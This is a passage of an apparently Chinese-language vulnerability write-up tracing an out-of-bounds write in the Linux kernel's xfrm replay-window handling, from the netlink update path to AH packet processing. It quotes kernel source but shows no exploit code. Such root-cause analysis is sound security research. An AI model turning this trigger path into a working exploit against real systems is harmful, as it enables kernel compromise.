<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xfrm_init_replay</span><span class="params">(struct xfrm_state *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_replay_state_esn</span> *<span class="title">replay_esn</span> = <span class="title">x</span>-&gt;<span class="title">replay_esn</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (replay_esn) &#123;</span><br><span class="line">		<span class="keyword">if</span> (replay_esn-&gt;replay_window &gt;</span><br><span class="line">		    replay_esn-&gt;bmp_len * <span class="keyword">sizeof</span>(__u32) * <span class="number">8</span>)<span class="comment">//不大于bmp本身长度</span></span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (x-&gt;props.flags &amp; XFRM_STATE_ESN) &#123;</span><br><span class="line">			<span class="keyword">if</span> (replay_esn-&gt;replay_window == <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">return</span> -EINVAL;</span><br><span class="line">			x-&gt;repl = &amp;xfrm_replay_esn;</span><br><span class="line">		&#125; <span class="keyword">else</span></span><br><span class="line">			x-&gt;repl = &amp;xfrm_replay_bmp;</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		x-&gt;repl = &amp;xfrm_replay_legacy;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(xfrm_init_replay);</span><br></pre></td></tr></table></figure>
<h2 id="xfrm-replay-state-esn结构体更新"><a href="#xfrm-replay-state-esn结构体更新" class="headerlink" title="xfrm_replay_state_esn结构体更新"></a>xfrm_replay_state_esn结构体更新</h2><p>对于一个<code>SA</code>，内核提供修改<code>replay_esn</code> 成员的功能，也就是<code>xfrm_alloc_replay_state_esn</code>申请的第一个内存块。在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L1926" target="_blank" rel="noopener">xfrm_new_ae</a>函数中，首先在[1]处循环查找哈希链表，得到<code>xfrm_state</code>结构体，查找标识是之前提到的三个要素。而在[2]处，对用户输入的<code>attr[XFRMA_REPLAY_ESN_VAL]</code>参数进行检查，也就是修改后的<code>replay_esn</code> 成员内容。最后在[3]处，利用<code>memcpy</code>进行成员内容修改。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">xfrm_new_ae</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="function"><span class="params">		struct nlattr **attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> = <span class="title">sock_net</span>(<span class="title">skb</span>-&gt;<span class="title">sk</span>);</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_state</span> *<span class="title">x</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">km_event</span> <span class="title">c</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EINVAL;</span><br><span class="line">	u32 mark = <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_mark</span> <span class="title">m</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_aevent_id</span> *<span class="title">p</span> = <span class="title">nlmsg_data</span>(<span class="title">nlh</span>);</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">rp</span> = <span class="title">attrs</span>[<span class="title">XFRMA_REPLAY_VAL</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">re</span> = <span class="title">attrs</span>[<span class="title">XFRMA_REPLAY_ESN_VAL</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">lt</span> = <span class="title">attrs</span>[<span class="title">XFRMA_LTIME_VAL</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">et</span> = <span class="title">attrs</span>[<span class="title">XFRMA_ETIMER_THRESH</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">rt</span> = <span class="title">attrs</span>[<span class="title">XFRMA_REPLAY_THRESH</span>];</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!lt &amp;&amp; !rp &amp;&amp; !re &amp;&amp; !et &amp;&amp; !rt)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* pedantic mode - thou shalt sayeth replaceth */</span></span><br><span class="line">	<span class="keyword">if</span> (!(nlh-&gt;nlmsg_flags&amp;NLM_F_REPLACE))</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	mark = xfrm_mark_get(attrs, &amp;m); <span class="comment">//copy XFRMA_MARK变量，返回值是u32</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]	x = xfrm_state_lookup(net, mark, &amp;p-&gt;sa_id.daddr, p-&gt;sa_id.spi, p-&gt;sa_id.proto, p-&gt;sa_id.family); <span class="comment">//循环查找hash表，得到xfrm_state结构体</span></span><br><span class="line">	<span class="keyword">if</span> (x == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ESRCH;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (x-&gt;km.state != XFRM_STATE_VALID)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">[<span class="number">2</span>]	err = xfrm_replay_verify_len(x-&gt;replay_esn, re); <span class="comment">//XFRMA_REPLAY_ESN_VAL参数检查</span></span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	spin_lock_bh(&amp;x-&gt;lock);</span><br><span class="line">[<span class="number">3</span>]	xfrm_update_ae_params(x, attrs, <span class="number">1</span>); <span class="comment">//memcpy</span></span><br><span class="line">	spin_unlock_bh(&amp;x-&gt;lock);</span><br><span class="line"></span><br><span class="line">	c.event = nlh-&gt;nlmsg_type;</span><br><span class="line">	c.seq = nlh-&gt;nlmsg_seq;</span><br><span class="line">	c.portid = nlh-&gt;nlmsg_pid;</span><br><span class="line">	c.data.aevent = XFRM_AE_CU;</span><br><span class="line">	km_state_notify(x, &amp;c);</span><br><span class="line">	err = <span class="number">0</span>;</span><br><span class="line">out:</span><br><span class="line">	xfrm_state_put(x);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>验证过程在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L403" target="_blank" rel="noopener">xfrm_replay_verify_len</a>函数中，可见在检查过程中主要检查了修改部分的<code>bmp_len</code>长度，该检查是因为<code>replay_esn</code>成员内存是直接进行复制的，不再二次分配。但缺少了对<code>replay_window</code>变量的检测，<strong>导致引用<code>replay_window</code>变量进行<code>bitmap</code>读写时造成的数组越界问题</strong>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">static inline int xfrm_replay_verify_len(struct xfrm_replay_state_esn *replay_esn,</span><br><span class="line">					 struct nlattr *rp)</span><br><span class="line">&#123;</span><br><span class="line">	struct xfrm_replay_state_esn *up;</span><br><span class="line">	int ulen;</span><br><span class="line"></span><br><span class="line">	if (!replay_esn || !rp)</span><br><span class="line">		return 0;</span><br><span class="line"></span><br><span class="line">	up = nla_data(rp);</span><br><span class="line">	ulen = xfrm_replay_state_esn_len(up);</span><br><span class="line"></span><br><span class="line">	if (nla_len(rp) &lt; ulen || xfrm_replay_state_esn_len(replay_esn) != ulen) //自身长度逻辑正确，ulen与原len相同</span><br><span class="line">		return -EINVAL;</span><br><span class="line"></span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="数组越界写定位"><a href="#数组越界写定位" class="headerlink" title="数组越界写定位"></a>数组越界写定位</h2><p>通过对<code>xfrm</code>模块代码中，<code>replay_window</code>关键字的查找，可以发现主要对这个关键字的操作位于<code>xfrm_replay_advance_esn</code>和<code>xfrm_replay_check_esn</code>函数中。而通过这两个函数的查找发现二者位于同一 结构体<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_replay.c#L578" target="_blank" rel="noopener">xfrm_replay_esn</a>下，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xfrm_replay</span> <span class="title">xfrm_replay_esn</span> = &#123;</span></span><br><span class="line">	.advance	= xfrm_replay_advance_esn,</span><br><span class="line">	.check		= xfrm_replay_check_esn,</span><br><span class="line">	.recheck	= xfrm_replay_recheck_esn,</span><br><span class="line">	.notify		= xfrm_replay_notify_esn,</span><br><span class="line">	.overflow	= xfrm_replay_overflow_esn,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>而定义这个结构体，可以发现这个结构体在之前提到过的<code>xfrm_init_replay</code>函数中被使用，并为<code>x-&gt;repl</code>成员赋值，因此转而寻找<code>x-&gt;repl</code>成员被调用的位置，最终跟踪到了<code>xfrm_input</code>函数，而<code>xfrm_input</code>函数之前被<a href="https://elixir.bootlin.com/linux/v4.10.6/source/include/net/xfrm.h#L1523" target="_blank" rel="noopener">xfrm4_rcv_spi</a> &lt;= <a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/ipv4/xfrm4_input.c#L155" target="_blank" rel="noopener">xfrm4_rcv</a> &lt;= <a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/ipv4/xfrm4_protocol.c#L118" target="_blank" rel="noopener">xfrm4_ah_rcv</a> 最终追溯到<code>AH</code>协议的内核协议栈中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_protocol</span> <span class="title">ah4_protocol</span> = &#123;</span></span><br><span class="line">	.handler	=	xfrm4_ah_rcv,</span><br><span class="line">	.err_handler	=	xfrm4_ah_err,</span><br><span class="line">	.no_policy	=	<span class="number">1</span>,</span><br><span class="line">	.netns_ok	=	<span class="number">1</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可见，通过发送<code>AH</code>数据包可以触发越界读写。</p>
<p>在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_input.c#L182" target="_blank" rel="noopener">xfrm_input</a>函数中，首先在[1]处利用<code>AH</code>数据包数据找到对应的<code>SA</code>，在[2]处调用<code>xfrm_replay_check_esn</code>进行检查，再调用<code>xfrm_replay_recheck_esn</code>再次检查，最终在[3]处调用<code>xfrm_replay_advance_esn</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xfrm_input</span><span class="params">(struct sk_buff *skb, <span class="keyword">int</span> nexthdr, __be32 spi, <span class="keyword">int</span> encap_type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> = <span class="title">dev_net</span>(<span class="title">skb</span>-&gt;<span class="title">dev</span>);</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line">	__be32 seq;</span><br><span class="line">	__be32 seq_hi;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_state</span> *<span class="title">x</span> = <span class="title">NULL</span>;</span></span><br><span class="line">	<span class="keyword">xfrm_address_t</span> *daddr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">xfrm_mode</span> *<span class="title">inner_mode</span>;</span></span><br><span class="line">	u32 mark = skb-&gt;mark;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> family;</span><br><span class="line">	<span class="keyword">int</span> decaps = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> async = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* A negative encap_type indicates async resumption. */</span></span><br><span class="line">	<span class="keyword">if</span> (encap_type &lt; <span class="number">0</span>) &#123; <span class="comment">//here is zero</span></span><br><span class="line">		async = <span class="number">1</span>;</span><br><span class="line">		x = xfrm_input_state(skb);</span><br><span class="line">		seq = XFRM_SKB_CB(skb)-&gt;seq.input.low;</span><br><span class="line">		family = x-&gt;outer_mode-&gt;afinfo-&gt;family;</span><br><span class="line">		<span class="keyword">goto</span> resume;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	daddr = (<span class="keyword">xfrm_address_t</span> *)(skb_network_header(skb) +</span><br><span class="line">				   XFRM_SPI_SKB_CB(skb)-&gt;daddroff);</span><br><span class="line">	family = XFRM_SPI_SKB_CB(skb)-&gt;family;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* if tunnel is present override skb-&gt;mark value with tunnel i_key */</span></span><br><span class="line">	<span class="keyword">switch</span> (family) &#123;</span><br><span class="line">	<span class="keyword">case</span> AF_INET:</span><br><span class="line">		<span class="keyword">if</span> (XFRM_TUNNEL_SKB_CB(skb)-&gt;tunnel.ip4) <span class="comment">// p32</span></span><br><span class="line">			mark = be32_to_cpu(XFRM_TUNNEL_SKB_CB(skb)-&gt;tunnel.ip4-&gt;parms.i_key);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> AF_INET6:</span><br><span class="line">		<span class="keyword">if</span> (XFRM_TUNNEL_SKB_CB(skb)-&gt;tunnel.ip6)</span><br><span class="line">			mark = be32_to_cpu(XFRM_TUNNEL_SKB_CB(skb)-&gt;tunnel.ip6-&gt;parms.i_key);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocate new secpath or COW existing one. */</span></span><br><span class="line">	<span class="keyword">if</span> (!skb-&gt;sp || atomic_read(&amp;skb-&gt;sp-&gt;refcnt) != <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">sec_path</span> *<span class="title">sp</span>;</span></span><br><span class="line"></span><br><span class="line">		sp = secpath_dup(skb-&gt;sp);</span><br><span class="line">		<span class="keyword">if</span> (!sp) &#123;</span><br><span class="line">			XFRM_INC_STATS(net, LINUX_MIB_XFRMINERROR);</span><br><span class="line">			<span class="keyword">goto</span> drop;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (skb-&gt;sp)</span><br><span class="line">			secpath_put(skb-&gt;sp);</span><br><span class="line">		skb-&gt;sp = sp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	seq = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!spi &amp;&amp; (err = xfrm_parse_spi(skb, nexthdr, &amp;spi, &amp;seq)) != <span class="number">0</span>) &#123; <span class="comment">//spi =0</span></span><br><span class="line">		XFRM_INC_STATS(net, LINUX_MIB_XFRMINHDRERROR);</span><br><span class="line">		<span class="keyword">goto</span> drop;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (skb-&gt;sp-&gt;len == XFRM_MAX_DEPTH) &#123;</span><br><span class="line">			XFRM_INC_STATS(net, LINUX_MIB_XFRMINBUFFERERROR);</span><br><span class="line">			<span class="keyword">goto</span> drop;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]		x = xfrm_state_lookup(net, mark, daddr, spi, nexthdr, family);<span class="comment">//找到对应的xfrm_state</span></span><br><span class="line">		<span class="keyword">if</span> (x == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			XFRM_INC_STATS(net, LINUX_MIB_XFRMINNOSTATES);</span><br><span class="line">			xfrm_audit_state_notfound(skb, family, spi, seq);</span><br><span class="line">			<span class="keyword">goto</span> drop;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		skb-&gt;sp-&gt;xvec[skb-&gt;sp-&gt;len++] = x;</span><br><span class="line"></span><br><span class="line">		spin_lock(&amp;x-&gt;lock);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (unlikely(x-&gt;km.state != XFRM_STATE_VALID)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (x-&gt;km.state == XFRM_STATE_ACQ)</span><br><span class="line">				XFRM_INC_STATS(net, LINUX_MIB_XFRMACQUIREERROR);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				XFRM_INC_STATS(net,</span><br><span class="line">					       LINUX_MIB_XFRMINSTATEINVALID);</span><br><span class="line">			<span class="keyword">goto</span> drop_unlock;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((x-&gt;encap ? x-&gt;encap-&gt;encap_type : <span class="number">0</span>) != encap_type) &#123;</span><br><span class="line">			XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEMISMATCH);</span><br><span class="line">			<span class="keyword">goto</span> drop_unlock;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//x-&gt;repl 在 xfrm_init_replay赋值，可调用xfrm_replay_check_esn</span></span><br><span class="line">[<span class="number">2</span>]		<span class="keyword">if</span> (x-&gt;repl-&gt;check(x, skb, seq)) &#123;</span><br><span class="line">			XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATESEQERROR);</span><br><span class="line">			<span class="keyword">goto</span> drop_unlock;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (xfrm_state_check_expire(x)) &#123;<span class="comment">//check x-&gt;lft内容</span></span><br><span class="line">			XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEEXPIRED);</span><br><span class="line">			<span class="keyword">goto</span> drop_unlock;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		spin_unlock(&amp;x-&gt;lock);</span><br><span class="line">		<span class="comment">//检查tunnel参数</span></span><br><span class="line">		<span class="keyword">if</span> (xfrm_tunnel_check(skb, x, family)) &#123;</span><br><span class="line">			XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEMODEERROR);</span><br><span class="line">			<span class="keyword">goto</span> drop;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//根据x-&gt;replay_esn中，seq、replay_windows关系，返回seqhi </span></span><br><span class="line">		seq_hi = htonl(xfrm_replay_seqhi(x, seq));</span><br><span class="line">		</span><br><span class="line">		XFRM_SKB_CB(skb)-&gt;seq.input.low = seq;</span><br><span class="line">		XFRM_SKB_CB(skb)-&gt;seq.input.hi = seq_hi;</span><br><span class="line"></span><br><span class="line">		skb_dst_force(skb);</span><br><span class="line">		dev_hold(skb-&gt;dev);</span><br><span class="line"></span><br><span class="line">		nexthdr = x-&gt;type-&gt;input(x, skb);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (nexthdr == -EINPROGRESS)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">resume:</span><br><span class="line">		dev_put(skb-&gt;dev);</span><br><span class="line"></span><br><span class="line">		spin_lock(&amp;x-&gt;lock);</span><br><span class="line">		<span class="keyword">if</span> (nexthdr &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (nexthdr == -EBADMSG) &#123;</span><br><span class="line">				xfrm_audit_state_icvfail(x, skb,</span><br><span class="line">							 x-&gt;type-&gt;proto);</span><br><span class="line">				x-&gt;stats.integrity_failed++;</span><br><span class="line">			&#125;</span><br><span class="line">			XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEPROTOERROR);</span><br><span class="line">			<span class="keyword">goto</span> drop_unlock;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* only the first xfrm gets the encap type */</span></span><br><span class="line">		encap_type = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// async = 0 并调用xfrm_replay_recheck_esn</span></span><br><span class="line">		<span class="keyword">if</span> (async &amp;&amp; x-&gt;repl-&gt;recheck(x, skb, seq)) &#123;</span><br><span class="line">			XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATESEQERROR);</span><br><span class="line">			<span class="keyword">goto</span> drop_unlock;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//调用xfrm_replay_advance_esn</span></span><br><span class="line">[<span class="number">3</span>]		x-&gt;repl-&gt;advance(x, seq);</span><br><span class="line"></span><br><span class="line">		x-&gt;curlft.bytes += skb-&gt;len;</span><br><span class="line">		x-&gt;curlft.packets++;</span><br><span class="line"></span><br><span class="line">		spin_unlock(&amp;x-&gt;lock);</span><br><span class="line"></span><br><span class="line">		XFRM_MODE_SKB_CB(skb)-&gt;protocol = nexthdr;</span><br><span class="line"></span><br><span class="line">		inner_mode = x-&gt;inner_mode;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (x-&gt;sel.family == AF_UNSPEC) &#123;</span><br><span class="line">			inner_mode = xfrm_ip2inner_mode(x, XFRM_MODE_SKB_CB(skb)-&gt;protocol);</span><br><span class="line">			<span class="keyword">if</span> (inner_mode == <span class="literal">NULL</span>) &#123;</span><br><span class="line">				XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEMODEERROR);</span><br><span class="line">				<span class="keyword">goto</span> drop;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (inner_mode-&gt;input(x, skb)) &#123;</span><br><span class="line">			XFRM_INC_STATS(net, LINUX_MIB_XFRMINSTATEMODEERROR);</span><br><span class="line">			<span class="keyword">goto</span> drop;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (x-&gt;outer_mode-&gt;flags &amp; XFRM_MODE_FLAG_TUNNEL) &#123;</span><br><span class="line">			decaps = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We need the inner address.  However, we only get here for</span></span><br><span class="line"><span class="comment">		 * transport mode so the outer address is identical.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		daddr = &amp;x-&gt;id.daddr;</span><br><span class="line">		family = x-&gt;outer_mode-&gt;afinfo-&gt;family;</span><br><span class="line"></span><br><span class="line">		err = xfrm_parse_spi(skb, nexthdr, &amp;spi, 